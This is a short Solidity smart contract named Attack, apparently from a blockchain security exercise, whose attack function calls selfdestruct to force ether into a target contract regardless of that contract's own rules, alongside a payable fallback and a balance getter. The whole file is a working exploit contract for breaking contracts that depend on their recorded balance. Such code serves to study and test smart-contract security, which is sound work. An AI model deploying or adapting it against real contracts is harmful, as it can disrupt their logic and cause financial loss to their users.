//SPDX-License-Identifier:MIT
pragma solidity ^0.8.7;


//using selfdestruct to force send the ether to target contract
contract Attack{

    function attack(address payable addr)external{
        selfdestruct(payable(addr));
    }

    function getBalance()external view returns(uint ){
        return address(this).balance;
    }

    fallback()external payable{

    }

}

